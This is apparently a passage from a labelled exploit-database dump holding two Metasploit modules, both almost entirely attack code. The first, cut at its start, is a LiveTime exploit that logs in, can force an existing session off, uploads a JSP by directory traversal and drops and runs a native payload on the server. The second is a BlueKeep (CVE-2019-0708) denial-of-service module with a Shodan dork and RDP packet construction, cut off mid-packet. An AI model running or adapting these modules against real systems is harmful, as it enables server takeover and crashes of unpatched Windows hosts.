class\=\""login-version-title\""\>\Version \#([0-9\.]+)\<\/p\>/       return $1.to_f     else       return 999     end   end     def check     version = get_version     if version <= 7.1 && version >= 6.5       return Exploit::CheckCode::Appears     elsif version > 7.1       return Exploit::CheckCode::Safe     else       return Exploit::CheckCode::Unknown     end   end     def pick_target     return target if target.name != 'Automatic'      print_status(""#{peer} - Determining target"")      os_finder_payload = %Q{<html><body><%out.println(System.getProperty(""os.name""));%></body><html>}      traversal_paths = []     if datastore['TRAVERSAL_PATH']       traversal_paths << datastore['TRAVERSAL_PATH']    # add user specified or default Virtual Appliance path     end      # add Virtual Appliance path plus the traversal in a Windows or Linux self install     traversal_paths.concat(['../../srv/tomcat6/webapps/LiveTime/','../../Server/webapps/LiveTime/'])      # test each path to determine OS (and correct path)     traversal_paths.each do |traversal_path|       jsp_name = upload_jsp(traversal_path, os_finder_payload)        res = send_request_cgi({         'uri'    => normalize_uri('LiveTime', jsp_name),         'method' => 'GET',         'headers' => {           'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',         },         'cookie' => @cookies       })        if res && res.code == 200         if res.body.to_s =~ /Windows/           @my_target = targets[2]         else           # Linux here           @my_target = targets[1]         end         if traversal_path.include? '/srv/tomcat6/webapps/'           register_files_for_cleanup('/srv/tomcat6/webapps/LiveTime/' + jsp_name)         else           register_files_for_cleanup('../webapps/LiveTime/' + jsp_name)         end         return traversal_path       end     end      return nil   end     def upload_jsp(traversal_path, jsp)     jsp_name  = Rex::Text.rand_text_alpha(6+rand(8)) + "".jsp""      post_data = Rex::MIME::Message.new     post_data.add_part(jsp, ""application/octet-stream"", 'binary', ""form-data; name=\""#{@upload_form}\""; filename=\""#{traversal_path}#{jsp_name}\"""")     data = post_data.to_s      res = send_request_cgi({       'method' => 'POST',       'uri'    => normalize_uri(@upload_url),       'headers' => {         'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',       },       'cookie' => @cookies,       'data'   => data,       'ctype'  => ""multipart/form-data; boundary=#{post_data.bound}""     })      if not res && res.code == 200       fail_with(Failure::Unknown, ""#{peer} - Failed to upload payload..."")     else       return jsp_name     end   end     def create_jsp     opts = {:arch => @my_target.arch, :platform => @my_target.platform}     payload = exploit_regenerate_payload(@my_target.platform, @my_target.arch)     exe = generate_payload_exe(opts)     base64_exe = Rex::Text.encode_base64(exe)      native_payload_name = rand_text_alpha(rand(6)+3)     ext = (@my_target['Platform'] == 'win') ? '.exe' : '.bin'      var_raw     = Rex::Text.rand_text_alpha(rand(8) + 3)     var_ostream = Rex::Text.rand_text_alpha(rand(8) + 3)     var_buf     = Rex::Text.rand_text_alpha(rand(8) + 3)     var_decoder = Rex::Text.rand_text_alpha(rand(8) + 3)     var_tmp     = Rex::Text.rand_text_alpha(rand(8) + 3)     var_path    = Rex::Text.rand_text_alpha(rand(8) + 3)     var_proc2   = Rex::Text.rand_text_alpha(rand(8) + 3)      if @my_target['Platform'] == 'linux'       var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)       chmod = %Q|       Process #{var_proc1} = Runtime.getRuntime().exec(""chmod 777 "" + #{var_path});       Thread.sleep(200);       |        var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)       cleanup = %Q|       Thread.sleep(200);       Process #{var_proc3} = Runtime.getRuntime().exec(""rm "" + #{var_path});       |     else       chmod = ''       cleanup = ''     end      jsp = %Q|     <%@page import=""java.io.*""%>     <%@page import=""sun.misc.BASE64Decoder""%>     <%     try {       String #{var_buf} = ""#{base64_exe}"";       BASE64Decoder #{var_decoder} = new BASE64Decoder();       byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());        File #{var_tmp} = File.createTempFile(""#{native_payload_name}"", ""#{ext}"");       String #{var_path} = #{var_tmp}.getAbsolutePath();        BufferedOutputStream #{var_ostream} =         new BufferedOutputStream(new FileOutputStream(#{var_path}));       #{var_ostream}.write(#{var_raw});       #{var_ostream}.close();       #{chmod}       Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});       #{cleanup}     } catch (Exception e) {     }     %>     |      jsp = jsp.gsub(/\n/, '')     jsp = jsp.gsub(/\t/, '')     jsp = jsp.gsub(/\x0d\x0a/, """")     jsp = jsp.gsub(/\x0a/, """")      return jsp   end     def exploit     version = get_version      # 1: get the cookies, the login_url and the password_form and username form names (they varies between versions)     res = send_request_cgi({       'method' => 'GET',       'uri' => normalize_uri('/LiveTime/WebObjects/LiveTime.woa'),       'headers' => {         'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',       }     })      if res && res.code == 200 && res.body.to_s =~ /class\=\""login\-form\""(.*)action\=\""([\w\/\.]+)(\;jsessionid\=)*/       login_url = $2       @cookies = res.get_cookies       if res.body.to_s =~ /type\=\""password\"" name\=\""([\w\.]+)\"" \/\>/         password_form = $1       else         # we shouldn't hit this condition at all, this is default for v7+         password_form = 'password'       end       if res.body.to_s =~ /type\=\""text\"" name\=\""([\w\.]+)\"" \/\>/         username_form = $1       else         # we shouldn't hit this condition at all, this is default for v7+         username_form = 'username'       end     else       fail_with(Failure::NoAccess, ""#{peer} - Failed to get the login URL."")     end      # 2: authenticate and get the import_url     res = send_request_cgi({       'method' => 'POST',       'uri' => normalize_uri(login_url),       'headers' => {         'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',       },       'cookie' => @cookies,       'vars_post' => {         username_form => datastore['USERNAME'],         password_form => datastore['PASSWORD'],         'ButtonLogin' => 'Login'       }     })      if res && res.code == 200 &&       (res.body.to_s =~ /id\=\""clientListForm\"" action\=\""([\w\/\.]+)\""\>/ || # v7 and above       res.body.to_s =~ /\<form method\=\""post\"" action\=\""([\w\/\.]+)\""\>/)   # v6.5       import_url = $1     else       # hmm either the password is wrong or someone else is using ""our"" account.. .       # let's try to boot him out       if res && res.code == 200 && res.body.to_s =~ /class\=\""login\-form\""(.*)action\=\""([\w\/\.]+)(\;jsessionid\=)*/ &&         res.body.to_s =~ /This account is in use on another system/          res = send_request_cgi({           'method' => 'POST',           'uri' => normalize_uri(login_url),           'headers' => {             'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',           },           'cookie' => @cookies,           'vars_post' => {             username_form => datastore['USERNAME'],             password_form => datastore['PASSWORD'],             'ButtonLoginOverride' => 'Login'           }         })         if res && res.code == 200 &&           (res.body.to_s =~ /id\=\""clientListForm\"" action\=\""([\w\/\.]+)\""\>/ || # v7 and above           res.body.to_s =~ /\<form method\=\""post\"" action\=\""([\w\/\.]+)\""\>/)   # v6.5           import_url = $1         else           fail_with(Failure::Unknown, ""#{peer} - Failed to get the import URL."")         end       else         fail_with(Failure::Unknown, ""#{peer} - Failed to get the import URL."")       end     end      # 3: get the upload_url     res = send_request_cgi({       'method' => 'POST',       'uri' => normalize_uri(import_url),       'headers' => {         'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',       },       'cookie' => @cookies,       'vars_post' => {         'ButtonImport' => 'Import'       }     })      if res && res.code == 200 &&       (res.body.to_s =~ /id\=\""clientImportUploadForm\"" action\=\""([\w\/\.]+)\""\>/ ||                         # v7 and above       res.body.to_s =~ /\<form method\=\""post\"" enctype\=\""multipart\/form-data\"" action\=\""([\w\/\.]+)\""\>/) # v6.5       @upload_url = $1     else       fail_with(Failure::Unknown, ""#{peer} - Failed to get the upload URL."")     end      if res.body.to_s =~ /\<input type\=\""file\"" name\=\""([0-9\.]+)\"" \/\>/       @upload_form = $1     else       # go with the default for 7.1.0, might not work with other versions...       @upload_form = ""0.53.19.0.2.7.0.3.0.0.1.1.1.4.0.0.23""     end      # 4: target selection     @my_target = nil     # pick_target returns the traversal_path and sets @my_target     traversal_path = pick_target     if @my_target.nil?       fail_with(Failure::NoTarget, ""#{peer} - Unable to select a target, we must bail."")     else       print_status(""#{peer} - Selected target #{@my_target.name} with traversal path #{traversal_path}"")     end      # When using auto targeting, MSF selects the Windows meterpreter as the default payload.     # Fail if this is the case and ask the user to select an appropriate payload.     if @my_target['Platform'] == 'linux' && payload_instance.name =~ /Windows/       fail_with(Failure::BadConfig, ""#{peer} - Select a compatible payload for this Linux target."")     end      # 5: generate the JSP with the payload     jsp = create_jsp     print_status(""#{peer} - Uploading payload..."")     jsp_name = upload_jsp(traversal_path, jsp)     if traversal_path.include? '/srv/tomcat6/webapps/'       register_files_for_cleanup('/srv/tomcat6/webapps/LiveTime/' + jsp_name)     else       register_files_for_cleanup('../webapps/LiveTime/' + jsp_name)     end      # 6: pwn it!     print_status(""#{peer} - Requesting #{jsp_name}"")     send_request_raw({'uri' => normalize_uri('LiveTime', jsp_name)})      handler   end end",directory traversal,1
47120,"Microsoft Windows Remote Desktop - 'BlueKeep' Denial of Service (Metasploit) # Exploit Title: Bluekeep Denial of Service (metasploit module) # Shodan Dork: port:3389 # Date: 07/14/2019 # Exploit Author: RAMELLA Sebastien (https://github.com/mekhalleh/) # Vendor Homepage: https://microsoft.com # Version: all affected RDP services by cve-2019-0708 # Tested on: Windows XP (32-bits) / Windows 7 (64-bits) # CVE : 2019-0708  # I just modified the initial metasploit module for this vuln to produce a denial of service attack.  ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Auxiliary   Rank = NormalRanking    include Msf::Auxiliary::Dos   include Msf::Auxiliary::Scanner   include Msf::Exploit::Remote::Tcp    def initialize(info = {})     super(update_info(info,       'Name'           => 'CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE',       'Description'    => %q{         This module checks a range of hosts for the CVE-2019-0708 vulnerability         by binding the MS_T120 channel outside of its normal slot and sending         DoS packets.       },       'Author'         =>       [         'National Cyber Security Centre', # Discovery         'JaGoTu',                         # Module         'zerosum0x0',                     # Module         'Tom Sellers',                    # TLS support and documented packets         'RAMELLA Sebastien'               # Denial of service module       ],       'References'     =>       [         [ 'CVE', '2019-0708' ],         [ 'URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708' ]       ],       'DisclosureDate' => '2019-05-14',       'License'        => MSF_LICENSE,       'Notes'          =>       {         'Stability' => [ CRASH_OS_DOWN ],         'AKA'       => ['BlueKeep']       }     ))      register_options(       [         OptAddress.new('RDP_CLIENT_IP', [ true, 'The client IPv4 address to report during connection', '192.168.0.100']),         OptString.new('RDP_CLIENT_NAME', [ false, 'The client computer name to report during connection', 'rdesktop']),         OptString.new('RDP_DOMAIN', [ false, 'The client domain name to report during connection', '']),         OptString.new('RDP_USER', [ false, 'The username to report during connection.']),         OptAddressRange.new(""RHOSTS"", [ true, 'Target address, address range or CIDR identifier']),         OptInt.new('RPORT', [true, 'The target TCP port on which the RDP protocol response', 3389])       ]     )   end    # ------------------------------------------------------------------------- #    def bin_to_hex(s)     return(s.each_byte.map { | b | b.to_s(16).rjust(2, '0') }.join)   end    def bytes_to_bignum(bytesIn, order = ""little"")     bytes = bin_to_hex(bytesIn)     if(order == ""little"")       bytes = bytes.scan(/../).reverse.join('')     end     s = ""0x"" + bytes      return(s.to_i(16))   end    ## https://www.ruby-forum.com/t/integer-to-byte-string-speed-improvements/67110   def int_to_bytestring(daInt, num_chars = nil)     unless(num_chars)       bits_needed = Math.log(daInt) / Math.log(2)       num_chars = (bits_needed / 8.0).ceil     end     if(pack_code = { 1 => 'C', 2 => 'S', 4 => 'L' }[ num_chars ])       [daInt].pack(pack_code)     else       a = (0..(num_chars)).map{ | i |         (( daInt >> i*8 ) & 0xFF ).chr       }.join       a[0..-2]                                                                 # Seems legit lol!     end   end    def open_connection()     begin       connect()       sock.setsockopt(::Socket::IPPROTO_TCP, ::Socket::TCP_NODELAY, 1)     rescue ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e       vprint_error(""Connection error: #{e.message}"")       return(false)     end        return(true)   end    def rsa_encrypt(bignum, rsexp, rsmod)     return((bignum ** rsexp) % rsmod)   end    # ------------------------------------------------------------------------- #    ## Used to abruptly abort scanner for a given host.   class RdpCommunicationError < StandardError   end      ## Define standard RDP constants.   class RDPConstants     PROTOCOL_RDP = 0   end    DEFAULT_CHANNELS_DEFS =   ""\x04\x00\x00\x00"" +                 # channelCount: 4    ## Channels definitions consist of a name (8 bytes) and options flags   ## (4 bytes). Names are up to 7 ANSI characters with null termination.   ""\x72\x64\x70\x73\x6e\x64\x00\x00"" + # rdpsnd   ""\x0f\x00\x00\xc0"" +   ""\x63\x6c\x69\x70\x72\x64\x72\x00"" + # cliprdr   ""\x00\x00\xa0\xc0"" +   ""\x64\x72\x64\x79\x6e\x76\x63"" +     # drdynvc   ""\x00\x00\x00\x80\xc0"" +   ""\x4d\x53\x5f\x54\x31\x32\x30"" +     # MS_T120   ""\x00\x00\x00\x00\x00""    ## Builds x.224 Data (DT) TPDU - Section 13.7   def rdp_build_data_tpdu(data)     tpkt_length = data.length + 7      ""\x03\x00"" +                                                               # TPKT Header version 03, reserved 0     [tpkt_length].pack(""S>"") +                                                 # TPKT length     ""\x02\xf0"" +                                                               # X.224 Data TPDU (2 bytes)     ""\x80"" +                                                                   # X.224 End Of Transmission (0x80)     data   end    ## Build the X.224 packet, encrypt with Standard RDP Security as needed.   ## Default channel_id = 0x03eb = 1003.   def rdp_build_pkt(data, rc4enckey = nil, hmackey = nil, channel_id = ""\x03\xeb"", client_info = false, rdp_sec = true)     flags = 0     flags |= 0b1000 if(rdp_sec)                                                # Set SEC_ENCRYPT     flags |= 0b1000000 if(client_info)                                         # Set SEC_INFO_PKT      pdu = """"      ## TS_SECURITY_HEADER - 2.2.8.1.1.2.1     ## Send when the packet is encrypted w/ Standard RDP Security and in all Client Info PDUs.     if(client_info || rdp_sec)       pdu << [flags].pack(""S<"")                                                # flags  ""\x48\x00"" = SEC_INFO_PKT | SEC_ENCRYPT       pdu << ""\x00\x00""                                                        # flagsHi     end      if(rdp_sec)       ## Encrypt the payload with RDP Standard Encryption.       pdu << rdp_hmac(hmackey, data)[0..7]       pdu << rdp_rc4_crypt(rc4enckey, data)     else       pdu << data     end      user_data_len = pdu.length     udl_with_flag = 0x8000 | user_data_len      pkt =  ""\x64""                                                              # sendDataRequest     pkt << ""\x00\x08""                                                          # intiator userId (TODO: for a functional client this isn't static)     pkt << channel_id                                                          # channelId     pkt << ""\x70""                                                              # dataPriority     pkt << [udl_with_flag].pack(""S>"")     pkt << pdu      return(rdp_build_data_tpdu(pkt))   end    ## https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/73d01865-2eae-407f-9b2c-87e31daac471   ## Share Control Header - TS_SHARECONTROLHEADER - 2.2.8.1.1.1.1   def rdp_build_share_control_header(type, data, channel_id = ""\xf1\x03"")     total_len = data.length + 6      return(       [total_len].pack(""S<"") +                                                 # totalLength - includes all headers       [type].pack(""S<"") +                                                      # pduType - flags 16 bit, unsigned       channel_id +                                                             # PDUSource: 0x03f1 = 1009       data     )   end    ## https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/4b5d4c0d-a657-41e9-9c69-d58632f46d31   ## Share Data Header - TS_SHAREDATAHEADER - 2.2.8.1.1.1.2   def rdp_build_share_data_header(type, data)     uncompressed_len = data.length + 4      return(       ""\xea\x03\x01\x00"" +                                                     # shareId: 66538       ""\x00"" +                                                                 # pad1       ""\x01"" +                                                                 # streamID: 1       [uncompressed_len].pack(""S<"") +                                          # uncompressedLength - 16 bit, unsigned int       [type].pack(""C"") +                                                       # pduType2 - 8 bit, unsigned int - 2.2.8.1.1.2       ""\x00"" +                                                                 # compressedType: 0       ""\x00\x00"" +                                                             # compressedLength: 0       data     )   end    ## https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/6c074267-1b32-4ceb-9496-2eb941a23e6b   ## Virtual Channel PDU 2.2.6.1   def rdp_build_virtual_channel_pdu(flags, data)     data_len = data.length      return(       [data_len].pack(""L<"") +                                                  # length       [flags].pack(""L<"") +                                                     # flags       data     )   end    def rdp_calculate_rc4_keys(client_random, server_random)     ## preMasterSecret = First192Bits(ClientRandom) + First192Bits(ServerRandom).     preMasterSecret = client_random[0..23] + server_random[0..23]      ## PreMasterHash(I) = SaltedHash(preMasterSecret, I)     ## MasterSecret = PreMasterHash(0x41) + PreMasterHash(0x4242) + PreMasterHash(0x434343).     masterSecret = rdp_salted_hash(preMasterSecret, ""A"", client_random,server_random) +  rdp_salted_hash(preMasterSecret, ""BB"", client_random, server_random) + rdp_salted_hash(preMasterSecret, ""CCC"", client_random, server_random)      ## MasterHash(I) = SaltedHash(MasterSecret, I)     ## SessionKeyBlob = MasterHash(0x58) + MasterHash(0x5959) + MasterHash(0x5A5A5A).     sessionKeyBlob = rdp_salted_hash(masterSecret, ""X"", client_random, server_random) +  rdp_salted_hash(masterSecret, ""YY"", client_random, server_random) + rdp_salted_hash(masterSecret, ""ZZZ"", client_random, server_random)      ## InitialClientDecryptKey128 = FinalHash(Second128Bits(SessionKeyBlob)).     initialClientDecryptKey128 = rdp_final_hash(sessionKeyBlob[16..31], client_random, server_random)      ## InitialClientEncryptKey128 = FinalHash(Third128Bits(SessionKeyBlob)).     initialClientEncryptKey128 = rdp_final_hash(sessionKeyBlob[32..47], client_random, server_random)      macKey = sessionKeyBlob[0..15]      return initialClientEncryptKey128, initialClientDecryptKey128, macKey, sessionKeyBlob   end    def rdp_connection_initiation()     ## Code to check if RDP is open or not.     vprint_status(""Verifying RDP protocol..."")      vprint_status(""Attempting to connect using RDP security"")     rdp_send(pdu_negotiation_request(datastore['RDP_USER'], RDPConstants::PROTOCOL_RDP))      received = sock.get_once(-1, 5)      ## TODO: fix it.     if (received and received.include? ""\x00\x12\x34\x00"")       return(true)     end      return(false)   end    ##  FinalHash(K) = MD5(K + ClientRandom + ServerRandom).   def rdp_final_hash(k, client_random_bytes, server_random_bytes)     md5 = Digest::MD5.new      md5 << k     md5 << client_random_bytes     md5 << server_random_bytes      return([md5.hexdigest].pack(""H*""))   end    ## https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/7c61b54e-f6cd-4819-a59a-daf200f6bf94   ## mac_salt_key = ""W\x13\xc58\x7f\xeb\xa9\x10*\x1e\xddV\x96\x8b[d""   ## data_content = ""\x12\x00\x17\x00\xef\x03\xea\x03\x02\x00\x00\x01\x04\x00$\x00\x00\x00""   ## hmac         = rdp_hmac(mac_salt_key, data_content)                       # hexlified: ""22d5aeb486994a0c785dc929a2855923"".   def rdp_hmac(mac_salt_key, data_content)     sha1 = Digest::SHA1.new     md5 = Digest::MD5.new      pad1 = ""\x36"" * 40     pad2 = ""\x5c"" * 48      sha1 << mac_salt_key     sha1 << pad1     sha1 << [data_content.length].pack('<L')     sha1 << data_content      md5 << mac_salt_key     md5 << pad2     md5 << [sha1.hexdigest].pack(""H*"")      return([md5.hexdigest].pack(""H*""))   end    ## https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/927de44c-7fe8-4206-a14f-e5517dc24b1c   ## Parse Server MCS Connect Response PUD - 2.2.1.4   def rdp_parse_connect_response(pkt)     ptr = 0     rdp_pkt = pkt[0x49..pkt.length]      while(ptr < rdp_pkt.length)       header_type = rdp_pkt[ptr..ptr + 1]       header_length = rdp_pkt[ptr + 2..ptr + 3].unpack(""S<"")[0]       # vprint_status(""header: #{bin_to_hex(header_type)}, len: #{header_length}"")        if(header_type == ""\x02\x0c"")         # vprint_status(""Security header"")          server_random = rdp_pkt[ptr + 20..ptr + 51]         public_exponent = rdp_pkt[ptr + 84..ptr + 87]          modulus = rdp_pkt[ptr + 88..ptr + 151]         # vprint_status(""modulus_old: #{bin_to_hex(modulus)}"")          rsa_magic = rdp_pkt[ptr + 68..ptr + 71]         if(rsa_magic != ""RSA1"")           print_error(""Server cert isn't RSA, this scenario isn't supported (yet)."")           raise RdpCommunicationError         end         # vprint_status(""RSA magic: #{rsa_magic}"")                  bitlen = rdp_pkt[ptr + 72..ptr + 75].unpack(""L<"")[0] - 8         vprint_status(""RSA #{bitlen}-bits"")          modulus = rdp_pkt[ptr + 88..ptr + 87 + bitlen]         # vprint_status(""modulus_new: #{bin_to_hex(modulus)}"")       end        ptr += header_length     end      # vprint_status(""SERVER_MODULUS:  #{bin_to_hex(modulus)}"")     # vprint_status(""SERVER_EXPONENT: #{bin_to_hex(public_exponent)}"")     # vprint_status(""SERVER_RANDOM:   #{bin_to_hex(server_random)}"")      rsmod = bytes_to_bignum(modulus)     rsexp = bytes_to_bignum(public_exponent)     rsran = bytes_to_bignum(server_random)      vprint_status(""MODULUS:  #{bin_to_hex(modulus)} - #{rsmod.to_s}"")     vprint_status(""EXPONENT: #{bin_to_hex(public_exponent)} - #{rsexp.to_s}"")     vprint_status(""SVRANDOM: #{bin_to_hex(server_random)} - #{rsran.to_s}"")      return rsmod, rsexp, rsran, server_random, bitlen   end    def rdp_rc4_crypt(rc4obj, data)     rc4obj.encrypt(data)   end    ## https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/705f9542-b0e3-48be-b9a5-cf2ee582607f   ## SaltedHash(S, I) = MD5(S + SHA(I + S + ClientRandom + ServerRandom))   def rdp_salted_hash(s_bytes, i_bytes, client_random_bytes, server_random_bytes)     sha1 = Digest::SHA1.new     md5 = Digest::MD5.new      sha1 << i_bytes     sha1 << s_bytes     sha1 << client_random_bytes     sha1 << server_random_bytes      md5 << s_bytes     md5 << [sha1.hexdigest].pack(""H*"")      return([md5.hexdigest].pack(""H*""))   end    def rdp_recv()     buffer_1 = sock.get_once(4, 5)     raise RdpCommunicationError unless buffer_1                                # nil due to a timeout      buffer_2 = sock.get_once(buffer_1[2..4].unpack(""S>"")[0], 5)     raise RdpCommunicationError unless buffer_2                                # nil due to a timeout      vprint_status(""Received data: #{bin_to_hex(buffer_1 + buffer_2)}"")     return(buffer_1 + buffer_2)   end    def rdp_send(data)     vprint_status(""Send data: #{bin_to_hex(data)}"")      sock.put(data)   end    def rdp_sendrecv(data)     rdp_send(data)      return(rdp_recv())   end    # ------------------------------------------------------------------------- #    ## https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/18a27ef9-6f9a-4501-b000-94b1fe3c2c10   ## Client X.224 Connect Request PDU - 2.2.1.1   def pdu_negotiation_request(user_name = """", requested_protocols = RDPConstants::PROTOCOL_RDP)     ## Blank username is valid, nil is random.     user_name = Rex::Text.rand_text_alpha(12) if(user_name.nil?)     tpkt_len = user_name.length + 38     x224_len = user_name.length + 33      return(       ""\x03\x00"" +                                                             # TPKT Header version 03, reserved 0       [tpkt_len].pack(""S>"") +                                                  # TPKT length: 43       [x224_len].pack(""C"") +                                                   # X.224 LengthIndicator       ""\xe0"" +                                                                 # X.224 Type: Connect Request       ""\x00\x00"" +                                                             # dst reference       ""\x00\x00"" +                                                             # src reference       ""\x00"" +                                                                 # class and options       ""\x43\x6f\x6f\x6b\x69\x65\x3a\x20\x6d\x73\x74\x73\x68\x61\x73\x68\x3d"" + # cookie - literal 'Cookie: mstshash='       user_name +                                                              # Identifier ""username""       ""\x0d\x0a"" +                                                             # cookie terminator       ""\x01\x00"" +                                                             # Type: RDP Negotiation Request (0x01)       ""\x08\x00"" +                                                             # Length       [requested_protocols].pack('L<')                                         # requestedProtocols     )   end    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/db6713ee-1c0e-4064-a3b3-0fac30b4037b   def pdu_connect_initial(selected_proto = RDPConstants::PROTOCOL_RDP, host_name = ""rdesktop"", channels_defs = DEFAULT_CHANNELS_DEFS)     ## After negotiating TLS or NLA the connectInitial packet needs to include the     ## protocol selection that the server indicated in its negotiation response.      ## TODO: If this is pulled into an RDP library then the channel list likely     ## needs to be build dynamically. For example, MS_T120 likely should only     ## ever be sent as part of checks for CVE-2019-0708.      ## build clientName - 12.2.1.3.2 Client Core Data (TS_UD_CS_CORE)     ## 15 characters + null terminator, converted to unicode     ## fixed length - 32 characters total     name_unicode = Rex::Text.to_unicode(host_name[0..14], type = 'utf-16le')     name_unicode += ""\x00"" * (32 - name_unicode.length)      pdu = ""\x7f\x65"" +                                                         # T.125 Connect-Initial    (BER: Application 101)     ""\x82\x01\xb2"" +                                                           # Length                   (BER: Length)     ""\x04\x01\x01"" +                                                           # CallingDomainSelector: 1 (BER: OctetString)     ""\x04\x01\x01"" +                                                           # CalledDomainSelector: 1  (BER: OctetString)     ""\x01\x01\xff"" +                                                           # UpwaredFlag: True        (BER: boolean)      ## Connect-Initial: Target Parameters     ""\x30\x19"" +                                                               # TargetParamenters        (BER: SequenceOf)     ## *** not sure why the BER encoded Integers below have 2 byte values instead of one ***     ""\x02\x01\x22\x02\x01\x02\x02\x01\x00\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\xff\xff\x02\x01\x02"" +      ## Connect-Intial: Minimum Parameters     ""\x30\x19"" +                                                               # MinimumParameters        (BER: SequencOf)     ""\x02\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\x04\x20\x02\x01\x02"" +      ## Connect-Initial: Maximum Parameters     ""\x30\x1c"" +                                                               # MaximumParameters        (BER: SequencOf)     ""\x02\x02\xff\xff\x02\x02\xfc\x17\x02\x02\xff\xff\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\xff\xff\x02\x01\x02"" +      ## Connect-Initial: UserData     ""\x04\x82\x01\x51"" +                                                       # UserData, length 337     (BER: OctetString)      ## T.124 GCC Connection Data (ConnectData) - PER Encoding used     ""\x00\x05"" +                                                               # object length     ""\x00\x14\x7c\x00\x01"" +                                                   # object: OID 0.0.20.124.0.1 = Generic Conference Control     ""\x81\x48"" +                                                               # Length: ??? (Connect PDU)     ""\x00\x08\x00\x10\x00\x01\xc0\x00"" +                                       # T.124 Connect PDU, Conference name 1     ""\x44\x75\x63\x61"" +                                                       # h221NonStandard: 'Duca' (client-to-server H.221 key)     ""\x81\x3a"" +                                                               # Length: ??? (T.124 UserData section)      ## Client MCS Section - 2.2.1.3     ""\x01\xc0"" +                                                               # clientCoreData (TS_UD_CS_CORE) header - 2.2.1.3.2     ""\xea\x00"" +                                                               # Length: 234 (includes header)     ""\x0a\x00\x08\x00"" +                                                       # version: 8.1 (RDP 5.0 -> 8.1)     ""\x80\x07"" +                                                               # desktopWidth: 1920     ""\x38\x04"" +                                                               # desktopHeigth: 1080     ""\x01\xca"" +                                                               # colorDepth: 8 bpp     ""\x03\xaa"" +                                                               # SASSequence: 43523     ""\x09\x04\x00\x00"" +                                                       # keyboardLayout: 1033 (English US)     ""\xee\x42\x00\x00"" +                                                       # clientBuild: ????     [name_unicode].pack(""a*"") +                                                # clientName     ""\x04\x00\x00\x00"" +                                                       # keyboardType: 4 (IBMEnhanced 101 or 102)     ""\x00\x00\x00\x00"" +                                                       # keyboadSubtype: 0     ""\x0c\x00\x00\x00"" +                                                       # keyboardFunctionKey: 12     ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" +       # imeFileName (64 bytes)     ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" +     ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" +     ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" +     ""\x01\xca"" +                                                               # postBeta2ColorDepth: 8 bpp     ""\x01\x00"" +                                                               # clientProductID: 1     ""\x00\x00\x00\x00"" +                                                       # serialNumber: 0     ""\x18\x00"" +                                                               # highColorDepth: 24 bpp     ""\x0f\x00"" +                                                               # supportedColorDepths: flag (24 bpp | 16 bpp | 15 bpp)     ""\xaf\x07"" +                                                               # earlyCapabilityFlags     ""\x62\x00\x63\x00\x37\x00\x38\x00\x65\x00\x66\x00\x36\x00\x33\x00"" +       # clientDigProductID (64 bytes)     ""\x2d\x00\x39\x00\x64\x00\x33\x00\x33\x00\x2d\x00\x34\x00\x31\x00"" +     ""\x39\x38\x00\x38\x00\x2d\x00\x39\x00\x32\x00\x63\x00\x66\x00\x2d"" +     ""\x00\x00\x31\x00\x62\x00\x32\x00\x64\x00\x61\x00\x42\x42\x42\x42"" +     ""\x07"" +                                                                   # connectionType: 7     ""\x00"" +                                                                   # pad1octet          ## serverSelectedProtocol - After negotiating TLS or CredSSP this value     ## must match the selectedProtocol value from the server's Negotiate     ## Connection confirm PDU that was sent before encryption was started.     [selected_proto].pack('L<') +                                              # ""\x01\x00\x00\x00""          ""\x56\x02\x00\x00"" +     ""\x50\x01\x00\x00"" +     ""\x00\x00"" +     ""\x64\x00\x00\x00"" +     ""\x64\x00\x00\x00"" +      ""\x04\xc0"" +                                                               # clientClusterdata (TS_UD_CS_CLUSTER) header - 2.2.1.3.5     ""\x0c\x00"" +                                                               # Length: 12 (includes header)     ""\x15\x00\x00\x00"" +                                                       # flags (REDIRECTION_SUPPORTED | REDIRECTION_VERSION3)     ""\x00\x00\x00\x00"" +                                                       # RedirectedSessionID     ""\x02\xc0"" +                                                               # clientSecuritydata (TS_UD_CS_SEC) header - 2.2.1.3.3     ""\x0c\x00"" +                                                               # Length: 12 (includes header)     ""\x1b\x00\x00\x00"" +                                                       # encryptionMethods: 3 (40 bit | 128 bit)     ""\x00\x00\x00\x00"" +                                                       # extEncryptionMethods (French locale only)     ""\x03\xc0"" +                                                               # clientNetworkData (TS_UD_CS_NET) - 2.2.1.3.4     